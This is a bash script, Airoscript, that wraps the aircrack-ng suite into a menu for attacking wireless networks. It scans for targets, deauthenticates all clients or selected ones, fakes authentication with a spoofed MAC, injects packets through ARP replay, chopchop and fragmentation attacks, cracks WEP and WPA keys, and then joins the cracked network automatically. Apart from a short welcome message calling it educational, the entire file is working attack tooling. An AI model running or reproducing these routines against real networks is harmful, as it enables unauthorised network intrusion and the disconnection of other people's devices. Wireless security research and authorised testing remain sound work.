#! /bin/bash

# Program:	Airoscript                                                          
# Authors:	Base Code by Daouid; Mods & Tweaks by CurioCT and others
# Credits:      Hirte, Befa, Stouf, Mister_X, ASPj , Andrea, Pilotsnipes and darkAudax
# Date:	        21.01.2007
# Version:	BETA-1 2.0.7 TESTING RELEASE FOR AIRCRACK-NG 0.7
# 
# Dependencies: aircrack-ng,xterm,grep,awk,drivers capable of injection
#
#		To change color theme just do a search and replace
#
#     Colors:   #Dumping	White	#FFFFFF                                            
#               #Injection	Green	#1DFF00                                            
#               #Association	Red	#FF0009                                            
#               #Deauth	        Blue	#99CCFF                                            
#               #Background	Black	#000000                                            
#                                                                                           
# Notes:  Important  ===>>>  Set variable DEBUG to 1 to enable debugging of errors  <<<===
#
WELCOME="0"
DEBUG="0"
#This is the interface you want to use to perform the attack
#If you dont set this, airoscript will ask you for interface to use
WIFI=""
#This is the rate per second at wich packets will be injected
INJECTRATE="1024"
#How many times the deauth attack is run
DEAUTHTIME="4"
#Time between re-association with target AP
AUTHDELAY="45"
#Fudge factor setting
FUDGEFACTOR="2"
#Path to binaries                                     
AIRMON="airmon-ng"		
AIRODUMP="airodump-ng"
AIREPLAY="aireplay-ng"	
AIRCRACK="aircrack-ng"
ARPFORGE="packetforge-ng"
#The path where the data is stored (FOLDER MUST EXIST !)
DUMP_PATH="/tmp"
# Path to your wordlist file (for WPA and WEP dictionnary attack)
WORDLIST="/tmp/english.txt"
#The Mac address used to associate with AP during fakeauth			
FAKE_MAC="00:01:02:03:04:05"
# IP of the access to be used for CHOPCHOP and Fragmentation attack
Host_IP="192.168.1.1"
FRAG_HOST_IP="255.255.255.255"
# same for client 
Client_IP="192.168.1.37"
FRAG_CLIENT_IP="255.255.255.255"
# leave this alone (if you edit this, it will screw up the menu)
CHOICES="1 2 3 4 5 6 7 8 9 10 11 12 13 14 15"
#This is the window size and layout settings
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 96x25+0+0"
# Upper right window -0+0
TOPRIGHT="-geometry 70x25-0+0"
# Bottom left window +0-0
BOTTOMLEFT="-geometry 96x25+0-0"
# Bottom right window -0-0
BOTTOMRIGHT="-geometry 70x25-0-0"
TOPLEFTBIG="-geometry 96x60+0+0"
TOPRIGHTBIG="-geometry 70x60-0+0"
##################################################################################
#
#  Functions: these are all the commands used by the script
#
# starts monitor mode on selected interface		
function monitor_interface {
IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
	clear
	echo $IS_MONITOR 
}
# this sets wifi interface if not hard coded in the script
function setinterface {
INTERFACES=`iwconfig | grep ESSID | awk '{ print $1 }'| grep -v lo | grep -v inet*`
	clear
	if [ $WIFI =  ]
		then
			echo "Choose wich network interface you would like to use:"
			echo " "
				select WIFI in $INTERFACES; do
				break;
			done
		clear
		echo "Interface to use is now set to: $WIFI"
	else
		clear 
	fi
}
# this function allows debugging of xterm commands
function debug {
	clear
	if [ $DEBUG = 1 ]
		then
			echo "Debug Mode On"
			echo " "
			HOLD="-hold"
		clear
	else
		HOLD=""
		clear 
	fi
}
# This is another great contribution from CurioCT that allows you to manually enter SSID if none is set
function blankssid {
while true; do
  clear
  echo ""
  echo "A blank SSID has been detected, would you like to manually enter an SSID?"
  echo ""
  echo "1) Yes "
  echo "2) No "
  read yn
  echo ""
  case $yn in
    1 ) Host_ssidinput ; break ;;
    2 ) Host_SSID="" ; break ;;
    * ) echo "unknown response. Try again" ;;
esac
done
}
# This is the input part of previous function
function Host_ssidinput {
echo -n "OK, now type in the ESSID ==> "
read Host_SSID
echo You typed $Host_SSID
set -- ${Host_SSID}
clear
}
# This is the function to select Target from a list	
function Parseforap {
## MAJOR CREDITS TO: Befa , MY MASTER, I have an ALTAR dedicated to him in my living room  
## And HIRTE for making all those great patch and fixing the SSID issue
ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
clear
echo ""
echo "    Here are the access point detected during step 1"
echo ""
echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
echo ""
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
 longueur=${#MAC}
   if [ $longueur -ge 17 ]; then
    i=$(($i+1))
    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
    aidlenght=$IDLENGTH
    assid[$i]=$ESSID
    achannel[$i]=$CHANNEL
    amac[$i]=$MAC
    aprivacy[$i]=$PRIVACY
   fi
done < $DUMP_PATH/dump-02.txt
echo ""
echo "    Please enter desired Access Point's Number"
echo ""
read choice
idlenght=${aidlenght[$choice]}
ssid=${assid[$choice]}
channel=${achannel[$choice]}
mac=${amac[$choice]}
privacy=${aprivacy[$choice]}
Host_IDL=$idlength
Host_ENC=$privacy
Host_MAC=$mac
Host_CHAN=$channel
acouper=${#ssid}
fin=$(($acouper-idlength))
Host_SSID=${ssid:1:fin}
}


# This is a simple function to ask what type of scan you want to run
function choosescan {
while true; do
  clear
  echo "Airodump will now be launched, hit ctrl+c when target(s) is found"
  echo ""
  echo "Do you want to scan on multiple channels or on a specific channel?"
  echo ""
  echo "1) Channel Hopping "
  echo "2) Specific channel(s) ex: 11 or  1,5-7,9,11-13 or 1,6,11 or 1-6 "
  read yn
  echo ""
  case $yn in
    1 ) Scan ; break ;;
    2 ) Scanchan ; break ;;  
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# This function ask after an AP selection for a client sel
function choosetarget {
while true; do
  clear
  echo ""
  echo "Do you want to select a client now ?"
  echo ""
  echo "1) Yes "
  echo "2) No "
  echo "3) Try to detect associated client"
  echo "4) Correct a bad SSID"
  echo "5) Jump to associated client list"
  read yn
  echo ""
  case $yn in
    1 ) askclientsel ; break ;;
    2 ) break ;;
    3 ) clientdetect && clientfound ; break ;;
    4 ) Host_ssidinput && choosetarget ; break ;;
    5 ) listsel2 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# this ask if the client scan was successfull
function clientfound {
while true; do
  clear
  echo ""
  echo "Did you find desired client?"
  echo ""
  echo "1) Yes "
  echo "2) No "
  read yn
  echo ""
  case $yn in
    1 ) listsel3 ; break ;;
    2 ) break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# deauth type sel
function choosedeauth {
while true; do
  clear
  echo ""
  echo "What kind of deauth do you want to do ?"
  echo ""
  echo "1) Everybody "
  echo "2) Myself "
  echo "3) Selected Client"
  read yn
  echo ""
  case $yn in
    1 ) deauthall ; break ;;
    2 ) deauthfake ; break ;;
    3 ) deauthclient ; break ;; 
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# this function ask for attack type
function attackwep {
while true; do
  clear
  echo "WEP ATTACK MODE"
  echo ""
  echo "Which attack would you like to perform?"
  echo ""
  echo "1) Fake association => Automatic"
  echo "2) Fake association => Interactive"
  echo "3) Using a client   => Automatic"
  echo "4) Using a client   => Interactive"
  echo "5) Fragmentation attack"
  echo "6) Chopchop attack"
  echo "7) Chopchop attack using a client"
  echo "8) Solo interactive attack (attempt to jump start stalled injections)"
  echo "9) Chopchop attack injection part of the attack"
  echo "10) Chopchop attack using a client injection part of the attack"
  read yn
  echo ""
  case $yn in
    1 ) attack ; break ;;
    2 ) fakeinteractiveattack ; break ;;
    3 ) attackclient ; break ;;
    4 ) interactiveattack ; break ;;
    5 ) fragmentationattack ; break ;;
    6 ) chopchopattack ; break ;;
    7 ) chopchopattackclient ; break ;;
    8 ) solointeractiveattack ; break ;;
    9 ) chopchopend ; break ;;
   10 ) chopchopclientend ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# this function ask for attack type
function attackopn {
while true; do
  clear
  echo "OPEN ATTACK MODE"
  echo ""
  echo "Which attack would you like to perform?"
  echo ""
  echo "1) Deauth           => Everybody"
  echo "2) Deauth           => Client"
  read yn
  echo ""
  case $yn in
    1 ) deauthall ; break ;;
    2 ) deauthclient ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# client origin 
function askclientsel {
while true; do
  clear
  echo ""
  echo "Do you want to select the client from a list or enter MAC address manually ?"
  echo ""
  echo "1) Detected clients "
  echo "2) Manual Input "
  echo "3) Jump to associated client list "
  read yn
  echo ""
  case $yn in
    1 ) asklistsel ; break ;;
    2 ) clientinput ; break ;;
    3 ) listsel2 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# manual client input
function clientinput {
echo -n "OK, now type in your client MAC: "
read Client_MAC
echo You typed: $Client_MAC
set -- ${Client_MAC}
}
# associated client or all clients ?
function asklistsel {
while true; do
  clear
  echo ""
  echo "Do you want to select the client from full list or associated clients only ?"
  echo ""
  echo "1) Only associated clients (Client connected to this SSID : $Host_SSID)"
  echo "2) Full list (All MAC detected, even Host are listed)"
if [ "$Host_SSID" = $'\r' ]
  		then
Host_SSID="No SSID has been detected!"
fi
  echo  
read yn
  case $yn in
    1 ) listsel2 ; break ;;
    2 ) listsel1 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# sel client from list    	
function listsel1 {
HOST=`cat $DUMP_PATH/dump-01.txt | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`
	clear
	echo "Select wich client you want to use for ARP replay"
	echo ""
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
# sel client from list, shows only associated clients	  	
function listsel2 {
HOST=`cat $DUMP_PATH/dump-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
	clear
	echo "Select which client you want to use for ARP replay"
	echo ""
	echo "The client(s) listed bellow is(are) connected to ==> "$Host_SSID
	echo ""
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
# sel client from list, shows only associated clients	  	
function listsel3 {
HOST=`cat $DUMP_PATH/$Host_MAC-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
	clear
	echo "Select which client you want to use for ARP replay"
	echo ""
	echo "The client(s) listed bellow is(are) connected to ==> "$Host_SSID
	echo ""
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
# reset and killall commands , + ejection/interruption of interface	
function cleanup {
	killall -9 aireplay-ng airodump-ng > /dev/null &
	ifconfig $WIFI down
	cardctl eject
	sleep 2
	cardctl insert
	ifconfig $WIFI up
	$AIRMON start $WIFI $Host_CHAN
	iwconfig $WIFI
}
# menu listing command	
function menu {
		echo ""
		echo "1.  Scan      ==> Launch a Scan to find targets"
		echo "2.  Select    ==> Select desired target: Host and Client"
		echo "3.  Attack    ==> Launch attack"
		echo "4.  Crack     ==> Starts searching for key with aircrack"
		echo "5.  Configure ==> Configure PC to connect using key found and DHCP"
		echo "6.  Associate ==> Try to associate to AP using a FAKE MAC"
		echo "7.  Deauth    ==> Disconnect desired station(s) from target"
		echo "8.  Reset     ==> Kills all airo-threads and reset card(pcmcia socket)"
		echo "9.  Monitor   ==> Enable monitor mode using airmon-ng"
		echo "10. Quit  "
		echo "11. AUTO      ==> step 1,2,3 linked"
		echo ""
		echo ""			
}
# target listing	
function target {
		clear
		echo "Access Point SSID     ==> "$Host_SSID
		echo "Access Point MAC      ==> "$Host_MAC
		echo "Access Point Channel  ==> "$Host_CHAN
		echo "Selected client       ==> "$Client_MAC
		echo "Access Point Security ==> "$Host_ENC
}  
# interface configuration using found key (tweaks by CurioCT) 	
function configure {
		$AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 $DUMP_PATH/$Host_MAC-01.cap &> $DUMP_PATH/$Host_MAC.key
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
		echo "Using this key $KEY to connect to: $Host_SSID"
		echo ""
		echo "Setting: iwconfig $WIFI mode Managed"
		ifconfig $WIFI down
		sleep 3
		ifconfig $WIFI up
		sleep 2
		iwconfig $WIFI mode Managed ap any rate auto channel $Host_CHAN essid "$Host_SSID" key restricted $KEY 
		sleep 1
		echo "Setting: iwconfig $WIFI essid $Host_SSID"
		iwconfig $WIFI essid "$Host_SSID"
		echo "Setting: iwconfig $WIFI key $KEY"
		iwconfig $WIFI key restricted $KEY
		echo "Setting: dhcpcd $WIFI"
		sleep 1
		iwconfig $WIFI rate auto
		iwconfig $WIFI ap any
		sleep 3
		iwconfig $WIFI ap any rate auto mode Managed channel $Host_CHAN essid "$Host_SSID" key restricted $KEY
		sleep 3
		dhcpcd $WIFI
		echo "Will now ping google.com"
		ping www.google.com
}
function wpaconfigure {
		$AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST &> $DUMP_PATH/$Host_MAC.key
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
		echo "Using this key $KEY to connect to: $Host_SSID"
		echo ""
		echo "Setting: iwconfig $WIFI mode Managed"
		ifconfig $WIFI down
		sleep 3
		ifconfig $WIFI up
		sleep 2
		iwconfig $WIFI mode Managed ap any rate auto channel $Host_CHAN essid "$Host_SSID" key restricted $KEY 
		sleep 1
		echo "Setting: iwconfig $WIFI essid $Host_SSID"
		iwconfig $WIFI essid "$Host_SSID"
		echo "Setting: iwconfig $WIFI key $KEY"
		iwconfig $WIFI key restricted $KEY
		echo "Setting: dhcpcd $WIFI"
		sleep 1
		iwconfig $WIFI rate auto
		iwconfig $WIFI ap any
		sleep 3
		iwconfig $WIFI ap any rate auto mode Managed channel $Host_CHAN essid "$Host_SSID" key restricted $KEY
		sleep 3
		dhcpcd $WIFI
		echo "Will now ping google.com"
		ping www.google.com
}
##################################################################################
#
#	Attack functions
function witchcrack {
if [ $Host_ENC = "WEP" ]
  		then
		echo "Will launch aircrack-ng searching for WEP KEY"
		crack
		elif [ $Host_ENC = "WPA" ]
		then
		echo "Will launch aircrack-ng searching for WPA KEY"
		wpacrack
		else
		echo "unknown encryption type"
		fi			
}
function witchattack {
if [ $Host_ENC = "WEP" ]
  		then
		echo "Will launch aircrack-ng searching for WEP KEY"
		attackwep
		elif [ $Host_ENC = "WPA" ]
		then
		echo "Will launch aircrack-ng searching for WPA KEY"
		wpahandshake
		else
		echo "unknown encryption type"
		attackopn
		fi			
}
function witchconfigure {
if [ $Host_ENC = "WEP" ]
  		then
		echo "Will configure interface using WEP KEY"
		configure
		elif [ $Host_ENC = "WPA" ]
		then
		echo "Will configure interface using WPA KEY"
		wpaconfigure
		else
		echo "unknown encryption type"
		fi			
}
# aircrack command 
function crack   {
	xterm $HOLD $TOPRIGHT -title "Aircracking: $Host_SSID" -hold -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap 
}
# WPA attack function
function wpahandshake {
	clear
	rm -rf $DUMP_PATH/$Host_MAC*
	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN $WIFI & deauthclient
}
function wpacrack {
xterm $HOLD $TOPRIGHT -title "Aircracking: $Host_SSID" -hold -e $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST
}
function Scan {
	clear
	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "Scanning for targets" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump $WIFI
}
# This scan for targets on a specific channel
function Scanchan {
echo -n "On which channel would you like to scan ? ==> "
read channel_number
echo You typed: $channel_number
set -- ${channel_number}
	clear
	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "Scanning for targets on channel $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --channel "$channel_number" $WIFI
}
function capture {
	clear
	rm -rf $DUMP_PATH/$Host_MAC*
	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN $WIFI
}
function deauthall {
	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking everybody from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
}
function deauthclient {
	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $Client_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $Client_MAC $WIFI
}
function deauthfake {
	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $FAKE_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $WIFI
}
function fakeauth {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth $AUTHDELAY -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI
}
# This is a set of command to manually kick all clients from selected AP to discover them
function clientdetect {
	capture & deauthall
}
# attack against client when a previous attack has stalled
function solointeractiveattack {
	xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -b $Host_MAC -d FF:FF:FF:FF:FF:FF -x $INJECTRATE & deauthclient
}
# fake attack function	
function attack {
	capture & xterm $HOLD -title "Injection: Host: $Host_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -h $FAKE_MAC  -x $INJECTRATE & fakeauth & deauthfake
}
# client type attack function
function attackclient {
	capture & xterm $HOLD -title "Injection: Host : $Host_MAC CLient : $Client_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -h $Client_MAC -x $INJECTRATE & deauthclient
}
# interactive attack with client
function interactiveattack {
	capture & xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -b $Host_MAC -d FF:FF:FF:FF:FF:FF -x $INJECTRATE -t 1 -f 0 -m 68 -n 68  & deauthclient
}
# interactive attack with fake mac
function fakeinteractiveattack {
	capture & xterm $HOLD -title "Interactive Packet Sel on Host: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -b $Host_MAC -d FF:FF:FF:FF:FF:FF -x $INJECTRATE -t 1 -f 0 -m 68 -n 68  & fakeauth & deauthfake
}

# Unstable allround function
function airomatic {
choosescan
Parseforap
choosetarget
attacktype
#sleep 60
#crack & configure	 
}
# Experimental features
function chopchopattack {
	clear
rm -rf $DUMP_PATH/$Host_MAC*
	capture &  fakeauth &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -b $Host_MAC $WIFI 
}
function chopchopattackclient {
	clear
rm -rf $DUMP_PATH/$Host_MAC*
	capture &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -h $Client_MAC $WIFI & deauthclient
}
function chopchopend {
rm -rf $DUMP_PATH/chopchop_$Host_MAC*
	$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap $WIFI
}
function chopchopclientend {
rm -rf $DUMP_PATH/chopchop_$Host_MAC*
	$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor
	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap $WIFI
}

function fragmentationattack {
rm -rf $DUMP_PATH/fragment-*.xor
rm -rf $DUMP_PATH/$Host_MAC*
killall -9 airodump-ng aireplay-ng
# iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
deauthclient & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture 

$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap

capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
}
function menufonction {
xterm $HOLD $TOPRIGHT -title "Fake function to jump to menu" -e echo "Aircrack-ng is a great tool, Mister_X ASPj HIRTE are GODS"
}
function greetings {
if [ $WELCOME = 1 ]
	then
echo "Welcome to Airoscript"
echo ""
echo "Airoscript is an educational tool designed to "
echo "encourage shell scripting and WIFI security learning"
echo ""
echo "Before you continue make sure you have set proper settings"
echo "Open this script in a text editor and configure variables"
echo ""
echo "First you need to make sure you have a working folder for Airoscript"
echo "Airoscript needs a real folder to work into"
echo ""
echo "Than you could set your interface and check binaries path"
echo "If you encounter errors please set the variable DEBUG to 1"
echo "This will allow you to see errors messages in xterm"
echo ""
echo "This message will disappear in a few seconds"
sleep 15
	else
		echo "no welcome msg for you" 
fi
}

##################################################################################
#
# Main Section this is the "menu" part, where all the functions are called		
#
#
	clear
	greetings
	setinterface
	debug
	menu	
select choix in $CHOICES; do					
	if [ "$choix" = "1" ]; then
	choosescan
	clear
	menu
	echo "Airodump closed, now use option 2 to select target"
	echo " "					
	elif [ "$choix" = "2" ]; then
	Parseforap
	clear
	choosetarget
	if [ "$Host_SSID" = $'\r' ]
 	then blankssid;
	target
	menu
	elif [ "$Host_SSID" = "No SSID has been detected!" ]
	then blankssid;
	target
	menu
	else
	target
	echo " "
	menu
	fi					
	elif [ "$choix" = "3" ]; then
	witchattack	
	clear
	echo "Attack starting with variables set to :"
	target
	sleep 2;
	menu
	elif [ "$choix" = "4" ]; then
	echo "launching aircrack, if aircrack shell closes quickly, try again with more IVs"
	witchcrack
	menu
	elif [ "$choix" = "5" ]; then
	witchconfigure
	menu	
	elif [ "$choix" = "6" ]; then
	echo launching fake auth commands
	fakeauth & menu	
	elif [ "$choix" = "7" ]; then
	choosedeauth
	menu
	elif [ "$choix" = "8" ]; then
	echo "Will restart interface and kill all airodump-ng and aireplay-ng threads"
	cleanup
	menu
	elif [ "$choix" = "9" ]; then
	monitor_interface
	menu
	elif [ "$choix" = "11" ]; then
	airomatic
	menu
	elif [ "$choix" = "10" ]; then
	echo Script terminated
exit			
	else
	clear
	menu
	echo " "
	echo "You did not enter a value in the menu, please try again"
	echo " "               
	fi
done
#END

